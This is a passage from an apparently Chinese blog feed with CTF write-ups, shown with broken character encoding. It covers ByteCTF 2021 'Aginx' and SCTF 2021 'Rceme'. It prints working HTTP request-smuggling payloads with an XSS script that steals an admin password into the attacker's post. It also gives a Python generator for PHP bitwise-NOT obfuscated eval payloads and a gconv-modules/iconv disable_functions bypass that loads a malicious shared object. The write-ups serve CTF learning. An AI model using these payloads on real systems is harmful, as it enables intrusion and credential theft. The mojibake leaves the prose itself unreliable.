go">&#123;&#123;.title&#125;&#125;&lt;br/&gt;&#123;&#123;.content&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>å†çœ‹æºç å‘ç°äº†è¿˜æœ‰ä¸€ä¸ªè¯»å–flagçš„åŠŸèƒ½ã€‚è¿™ä¸ªå¤„ç†è¿›è¡Œäº†ä¸¤ä¸ªåˆ¤æ–­é™åˆ¶ã€‚ä¸€æ˜¯ipåœ°å€çš„èŒƒå›´é™åˆ¶ï¼ŒäºŒæ˜¯å¿…é¡»ç”¨adminç”¨æˆ·ç™»å½•ã€‚å…‰æ˜¯ç¬¬ä¸€ä¸ªé™åˆ¶æˆ‘ä»¬åœ¨å‰ç«¯ç”¨æˆ·è‚¯å®šå°±æ— æ³•ç»•è¿‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œè‚¯å®šæ˜¯éœ€è¦é€šè¿‡botæ¥è®¿é—®åˆ°è¿™ä¸ªflagäº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/5ba5849157e646df8b94c4b4a893f6eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><p>[]: <a href="https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#">https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#</a>    â€œå®˜æ–¹wpâ€<br>[]: <a href="https://impakho.com/post/bytectf-2021-aginx-writeup">https://impakho.com/post/bytectf-2021-aginx-writeup</a>    â€œimpakhoâ€</p><p>çœ‹äº†å¤§ä½¬çš„wpè¿˜æœ‰å®˜æ–¹wpï¼Œä¸å¾—ä¸è¯´ä¸€æ­¥ä¸€æ­¥çš„æ·±å…¥åˆ†æçœŸçš„å¾ˆç»†è‡´ã€‚</p><p>ç›´æ¥çœ‹payloadå§</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/v4WPbblaISwL%20HTTP/1.1%0D%0AConnection:%20keep-alive%0D%0AHost:%20a%0D%0A%0D%0APOST%20%2Fv/articles/preview</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.105.13.40:30443<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>921<br><br>title=%7B%22data%22%3A%7B%22_id%22%3A%221%22%2C%22title%22%3A%222%22%2C%22author%22%3A%223%22%2C%22htmlContent%22%3A%22&amp;content=%3Cimg%20src%3D&#x27;test&#x27;%20onerror%3D&#x27;var%20xhttp1%20%3D%20new%20XMLHttpRequest()%3Bxhttp1.open(%5C%22POST%5C%22%2C%20%5C%22%2Fv%2Farticles%5C%22%2C%20true)%3Bxhttp1.setRequestHeader(%5C%22Content-Type%5C%22%2C%5C%22application%2Fjson%5C%22)%3Bxhttp1.setRequestHeader(%5C%22Authorization%5C%22%2C%5C%22Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzUwMTgxODYsInVzZXJuYW1lIjoiblZtU1N0UHpJU1E5In0.Z8kRojnNNNd6-g7Il3BPzvuGdVz-UtqaQzjWPsC1FMw%5C%22)%3Bxhttp1.send(JSON.stringify(%7B%5C%22title%5C%22%3A%5C%22here_is_pwd%5C%22%2C%5C%22content%5C%22%3Adocument.getElementById(%5C%22app%5C%22).__vue__.%24children%5B2%5D._data.form.password%2C%5C%22tags%5C%22%3A%5B%5D%2C%5C%22is_public%5C%22%3Afalse%7D))%3B&#x27;%3E%22%2C%22submissionTime%22%3A4%2C%22tags%22%3A%225%22%7D%2C%22status%22%3A0%7D<br></code></pre></div></td></tr></table></figure><p>åœ¨a-ginxä»£ç†è½¬å‘è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œä¹‹åä¼šçœ‹åˆ°å¦‚ä¸‹è¯·æ±‚ï¼Œè¿™ä¸ªçš„GETå’ŒPOSTä¼šè¢«å½“ä½œæ˜¯ä¸¤ä¸ªè¯·æ±‚çš„ï¼Œå› ä¸ºhttpçš„è¯·æ±‚åˆ†å‰²æ˜¯é€šè¿‡<code>%0D%0A%0D%0A</code>æ¥åˆ¤æ–­ã€‚è¿™é‡Œçš„GETè¯·æ±‚ä¹‹ååˆä¼šæ¥ç€å‘é€POSTï¼Œæ‰€ä»¥é€ æˆäº†è¯·æ±‚èµ°ç§ã€‚</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/v4WPbblaISwL</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>a<br><br>POST /v/articles/preview HTTP/2<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.105.13.40:30443<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>921<br>title=&#123;&quot;data&quot;:&#123;&quot;_id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;2&quot;,&quot;author&quot;:&quot;3&quot;,&quot;htmlContent&quot;:&quot;&amp;content=&lt;img src=&#x27;test&#x27; onerror=&#x27;var xhttp1 = new XMLHttpRequest();xhttp1.open(\&quot;POST\&quot;, \&quot;/v/articles\&quot;, true);xhttp1.setRequestHeader(\&quot;Content-Type\&quot;,\&quot;application/json\&quot;);xhttp1.setRequestHeader(\&quot;Authorization\&quot;,\&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzUwMTgxODYsInVzZXJuYW1lIjoiblZtU1N0UHpJU1E5In0.Z8kRojnNNNd6-g7Il3BPzvuGdVz-UtqaQzjWPsC1FMw\&quot;);xhttp1.send(JSON.stringify(&#123;\&quot;title\&quot;:\&quot;here_is_pwd\&quot;,\&quot;content\&quot;:document.getElementById(\&quot;app\&quot;).__vue__.$children[2]._data.form.password,\&quot;tags\&quot;:[],\&quot;is_public\&quot;:false&#125;));&#x27;&gt;&quot;,&quot;submissionTime&quot;:4,&quot;tags&quot;:&quot;5&quot;&#125;,&quot;status&quot;:0&#125;<br></code></pre></div></td></tr></table></figure><p>å¤šå‘é€å‡ æ¬¡è¯·æ±‚ä¹‹åå°±èƒ½çœ‹åˆ°é€šè¿‡goæ¨¡æ¿è¿”å›äº†<code>title</code>å’Œ<code>content</code>çš„å†…å®¹ã€‚å†è®¿é—®è¿™ä¸ªurlå°±è¡Œä¸‹è½½åˆ°é‚£ä¸ªé™æ€æ–‡ä»¶äº†</p><p><img src="https://img-blog.csdnimg.cn/5568c150eb374ae3bcb5f01e13d360c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹æ—¥å¿—èƒ½å‘ç°ï¼Œå‘é€äº†ä¸¤ä¸ªè¯·æ±‚</p><p><img src="https://img-blog.csdnimg.cn/ee1811ddef0e458f8678305bcd67f4c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220201165919306.png" alt="image-20220201165919306"></p><p>ä¸‹é¢å°±æ˜¯è¦è®©botæ¥è®¿é—®ä½ çš„ç¼“å­˜æ–‡ä»¶ï¼Œæ‰§è¡Œhtmlä¸­çš„ä»£ç é€ æˆxssã€‚è¿™é‡Œéœ€è¦å°†urlè¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œå› ä¸ºä¼šè½¬å‘ä¸¤æ¬¡</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">..%252F..%252Fstatic%2Fkkfine%2520HTTP%252F1.1%250D%250AConnection:%2520keep-alive%250D%250AHost:%2520a%250D%250A%250D%250APOST%2520%252Fv%252Farticles%252Fpreview<br></code></pre></div></td></tr></table></figure><p>æŸ¥çœ‹æ—¥å¿—</p><p><img src="https://img-blog.csdnimg.cn/41db3f167d884ea7b57864ece6a0f393.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œçš„è¯·æ±‚è¡¨æ˜æˆåŠŸè§¦å‘äº†xssä»£ç ï¼Œå›æ˜¾ä¸­çš„<code>title</code>å’Œ<code>content</code>ä¾¿èƒ½çœ‹å‡ºå¯†ç ã€‚è¿™é‡Œæ˜¯ä¸ä¼šå‘é€åˆ°åç«¯çš„ï¼Œå› ä¸ºèƒ½ç›´æ¥è·å–åˆ°é™æ€æ–‡ä»¶ã€‚è¿™ä¸ªåšæ³•å°±æ˜¯å’Œ<code>impakho</code>å¤§ä½¬å†™çš„ä¸€æ ·äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/2cb0521d1f0d47f49b71debdeaae9ce2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†çœ‹åˆ°å®˜æ–¹wpæ—¶å‘ç°è¿˜æœ‰æ›´ç®€å•çš„åšæ³•ã€‚å› ä¸ºå¤§ä½¬çš„æœ€ç»ˆæ”»å‡»æ–¹æ³•æ˜¯å…ˆè·å–åˆ°adminç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç™»å½•adminè´¦æˆ·æå–<code>Authorization</code>è®¤è¯ï¼Œå†ç”¨è¿™ä¸ªè®¤è¯å»è·å–flagï¼Œç„¶åå°†è¿”å›å†…å®¹å‘é€åˆ°è‡ªå·±è´¦æˆ·æ–‡ç« ä¸Šã€‚ä½†å®˜æ–¹wpè¿˜è¯´åˆ°äº†å¦ä¸€ç§ç®€æ€è·¯ï¼Œå°±æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦å»å·adminçš„å¯†ç ã€‚ä¸¤ç§åšæ³•çš„åŸå› åœ¨äºå‡ºé¢˜äººçš„æƒ³æ³•æœ€åè¿˜è€ƒåˆ°äº†ä¸€ä¸ªè·³è½¬æ—¶ä¹Ÿå¯è¿›è¡Œè¯·æ±‚èµ°ç§ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†flagæ³¨å…¥åˆ°ç¼“å­˜é‡Œé¢ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¹Ÿä¸éœ€è¦è§¦å‘xssï¼Œå½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªéé¢„æœŸã€‚</p><p>å…ˆæŒ‰ä¸Šé¢çš„æ–¹æ³•å‘<code>/static/kkfine.json</code>ä¸­å†™å…¥ä¸œè¥¿ï¼Œç„¶åç›´æ¥å‘botå‘é€idï¼ˆå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥å‘botå‘é€ä¸¤æ¬¡idï¼‰</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">..%25252f..%25252fstatic%252fkkfine.json%2520HTTP%252f1.1%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%2520%252fflag<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥å‘ç°ç»è¿‡ä¸¤æ¬¡è§£ç è¿™é‡Œå­˜åœ¨ä¸€ä¸ª301è·³è½¬ï¼Œå¹¶ä¸”èµ°ç§äº†ä¸€ä¸ª/flagè¯·æ±‚ï¼Œç„¶è€Œåœ¨301å†æ¬¡è¯·æ±‚æ—¶ï¼Œä¸Šä¸ªè¯·æ±‚å·²ç»è¢«ç¼“å­˜äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¼šå†ç»è¿‡webç«¯äº†ï¼Œflagå°±ç›´æ¥è¢«å‚¨å­˜åˆ°äº†ç¼“å­˜æ–‡ä»¶é‡Œã€‚</p><p><img src="https://img-blog.csdnimg.cn/42308bac7f3e422c8c9fb607b155ca56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/92e880cd4e82458bb3d8f77bf3ecdd8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹åç›´æ¥è¯·æ±‚æˆ‘ä»¬çš„ç¼“å­˜æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/2cc8660eb37d4d3291a8320244ae5419.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨å¤ç°è¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œå½“åŒæ—¶æœ‰å¤šä¸ªè¯·æ±‚æ—¶çš„ç¼“å­˜é—®é¢˜è®©æˆ‘å¯¹ç½‘ç»œä¸­å„ç§è¯·æ±‚å’Œè·³è½¬çš„ç†è§£æ›´æ·±äº†ã€‚</p><h1 id="Aginx2"><a href="#Aginx2" class="headerlink" title="Aginx2"></a>Aginx2</h1><h1 id="Nothing"><a href="#Nothing" class="headerlink" title="Nothing"></a>Nothing</h1>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTFå¤ç°</title>
    <link href="/2022/01/18/2022-1-18-SCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/01/18/2022-1-18-SCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>å½“æ—¶é‚£æ®µæ—¶é—´ä¸€ç›´åœ¨å¤ä¹ å°±æ²¡æ€ä¹ˆæ‰“æ¯”èµ›ï¼Œç°åœ¨æ”¾å‡ç»ˆäºæ˜¯æœ‰æ—¶é—´æ¥å¤ç°ä¸€äº›é¢˜ç›®ï¼Œå­¦æ–°çš„ä¸œè¥¿äº†ã€‚</p><h1 id="Rceme"><a href="#Rceme" class="headerlink" title="Rceme"></a>Rceme</h1><p>å‚è€ƒçš„ä¸€äº›æ–‡ç« </p><p><a href="http://naman.club/index.php/2022/01/11/sctf2021-web/">http://naman.club/index.php/2022/01/11/sctf2021-web/</a></p><p><a href="https://eastjun.top/2021/10/20/bypass_disable_function/">https://eastjun.top/2021/10/20/bypass_disable_function/</a></p><p><a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p><p>æºç ç›´æ¥ç»™å‡ºæ¥äº†ï¼Œçœ‹åˆ°<code>eval</code>åº”è¯¥è¦æ‰§è¡Œå‘½ä»¤ï¼Œä½†æœ‰è¿‡æ»¤ã€‚<code>preg_match</code>å…ˆæ˜¯è¿‡æ»¤äº†ä¸€å †å¯ç”¨å¾—å­—ç¬¦ï¼Œå¼‚æˆ–ï¼Œå­—æ¯ï¼Œæ•°å­—ç­‰éƒ½è¢«è¿‡æ»¤äº†ã€‚å­¦ä¹ äº†ä¸‹wpå‘ç°æ˜¯å¯ä»¥åˆ©ç”¨å–åæ¥æ„é€ éœ€è¦å¾—å‡½æ•°ï¼Œè¿™æ˜¯ç¬¬ä¸€æ­¥ã€‚ä½†è¿›å…¥ç•Œé¢è¿˜èƒ½çœ‹åˆ°<code>disable_functions</code>åŸºæœ¬ä¸Šå…¨éƒ½è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥åé¢è¿˜éœ€è¦ç»•è¿‡<code>disable_functions</code>æ‰è¡Œã€‚</p><p>é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªè¿‡æ»¤<code>preg_match</code>ï¼ŒåŸºæœ¬è¿‡æ»¤äº†å­—ç¬¦æ•°å­—ï¼Œè¿˜æœ‰ä¸€äº›ç¬¦å·ç­‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ­£åˆ™æ˜¯ä¸€ä¸ªé€’å½’æ­£åˆ™ï¼ˆé€’å½’æ­£åˆ™å¯ä»¥çœ‹çœ‹<a href="https://www.cnblogs.com/f-ck-need-u/p/11344531.html%EF%BC%89%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E9%80%92%E5%BD%92%E6%AD%A3%E5%88%99%E6%9C%89%E4%B8%A4%E7%A7%8D%E5%8C%B9%E9%85%8D%E6%96%B9%E5%BC%8F%EF%BC%8C">https://www.cnblogs.com/f-ck-need-u/p/11344531.htmlï¼‰ï¼Œè¿™é‡Œçš„é€’å½’æ­£åˆ™æœ‰ä¸¤ç§åŒ¹é…æ–¹å¼ï¼Œ</a></p><p>ç¬¬ä¸€ç§ç±»ä¼¼äºè¿™ç§<code>code=[~%00]([~%00]());</code>æ˜¯åœ¨é€’å½’åŒ¹é…<code>(?R)?</code>ä¸­çš„ï¼Ÿé€‰æ‹©è¿›è¡Œäº†1æ¬¡ï¼Œç¬¬äºŒç§ç±»ä¼¼äº<code>code=[~%00]();</code>æ˜¯åœ¨é€’å½’åŒ¹é…<code>(?R)?</code>ä¸­çš„ï¼Ÿé€‰æ‹©è¿›è¡Œäº†0æ¬¡ã€‚å½“ç„¶è¿™é‡Œä¹Ÿæ›¿æ¢æ‰äº†é™¤<code>\s ()</code>å¤–çš„ä¸œè¥¿ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure><p>ä¸ç®¡æ˜¯å¼‚æˆ–ï¼Œå–åï¼Œæˆ–ï¼Œå°±æ˜¯åˆ©ç”¨ä¸€äº›éå­—ç¬¦æ•°å­—å•åŒå¼•å·ç­‰è¿™äº›æœ‰ç”¨å¯è§çš„å…¶ä»–å­—ç¬¦ï¼Œé€šè¿‡æ•°å­¦æ“ä½œèƒ½å¤Ÿè½¬æ¢æˆå¦ä¸€ç§ç­‰ä»·çš„è¡¨ç°å½¢å¼ï¼Œä½†æ˜¯è¿™ç§å½¢å¼çš„å€¼å¯¹åº”ä¸€äº›æœ‰ç”¨çš„å­—ç¬¦ã€‚ä¾‹å¦‚è¯´å¼‚æˆ–</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></div></td></tr></table></figure><p>å–åå°±æ›´ç®€å•ï¼Œä¾‹å¦‚</p><p><img src="https://img-blog.csdnimg.cn/44e4ded69f404a3796c83dfe2dc1c859.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å­¦ä¹ å®Œä¸€äº›ä¸œè¥¿ï¼Œå°±å¼€å§‹åšé¢˜ã€‚è¿™é‡Œç”¨å–åæ„é€ ä¸€æ¡é“¾å­<code>create_function(...unserialize(end(getallheaders)))</code> å…¶ä¸­<code>...</code>æ˜¯åˆ©ç”¨å¯å˜é•¿åº¦å‚æ•°æ¥ä¼ å‚.</p><p>å†™ä¸ªè„šæœ¬æ„é€ payload,<code>!%FF</code>å°±æ˜¯0ï¼Œ<code>~%CF</code>ä¹Ÿå¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, quote<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOT_chain</span>(<span class="hljs-params">chain</span>):</span><br>    j = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain:<br>        j += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span> - <span class="hljs-built_in">ord</span>(i)))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> j<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_chain</span>(<span class="hljs-params">chains</span>):</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> chain <span class="hljs-keyword">in</span> chains:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;%d1%d1%d1&quot;</span> <span class="hljs-keyword">in</span> NOT_chain(chain):<br>            result += <span class="hljs-string">&quot;...[~&quot;</span> + NOT_chain(chain).replace(<span class="hljs-string">&quot;%d1%d1%d1&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)  + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result += <span class="hljs-string">&quot;[~&quot;</span> + NOT_chain(chain) + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>    result = result +<span class="hljs-string">&quot;))));&quot;</span><br>    <span class="hljs-keyword">return</span>  result<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;call_user_func(...unserialize(end(getallheaders)))&quot;</span><br>    chains = <span class="hljs-built_in">input</span>.strip(<span class="hljs-string">&#x27;)&#x27;</span>).split(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    <span class="hljs-comment"># print(make_chain(chains))</span><br>    <span class="hljs-comment">#[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span><br></code></pre></div></td></tr></table></figure><p>æŠ“åŒ…å‘é€è¯·æ±‚</p><p><img src="https://img-blog.csdnimg.cn/7e315a20ab4a426aa72b4861543342de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯åˆ©ç”¨åŸç”Ÿç±»å†™æ–‡ä»¶ï¼Œ<code>iconv</code>æ–¹bypasså¼ç»•è¿‡å‡½æ•°é™åˆ¶ï¼ŒåŸç†ç½‘ä¸Šä¹Ÿå¾ˆå¤š</p><p>å¯ä»¥åˆ©ç”¨<code>FilesystemIterator</code>ç±»è¯»æ–‡ä»¶ï¼Œæ ¹ç›®å½•ä¸å¯è¯»</p><p><img src="https://img-blog.csdnimg.cn/17a61ba0f4ce42b7b087815be33ffe9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ç€å¼€å§‹ç»•è¿‡disable_functionï¼Œåˆ©ç”¨<code>SplFileObject</code>å†™æ–‡ä»¶ï¼Œä¸€äº›postå†…å®¹</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=$file = new SplFileObject(&quot;/tmp/gconv-modules&quot;, &#x27;w+&#x27;);$file-&gt;fwrite(&quot;module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2<br>module  INTERNAL    EXP//    ../../../../../../../../tmp/exp    2&quot;);<br><br><br>å†™å…¥soæ–‡ä»¶æ—¶ä¹Ÿå°±æ˜¯ç”¨ä¼ªåè®®ä¼ base64è§£ç å¤ªé•¿äº†ä¸è´´äº†ã€‚<br><br>#è§¦å‘<br>cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=putenv(&quot;GCONV_PATH=/tmp/&quot;);$c=new SplFileObject(&#x27;php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==&#x27;);show_source(&quot;/tmp/flag&quot;);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/fc967ed38b6d420490442f1b8ee96681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…³äºä¸€äº›ç»•è¿‡è¿˜æœ‰å¾ˆå¤šæ–¹å¼</p><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><h1 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload_it"></a>Upload_it</h1><h2 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" 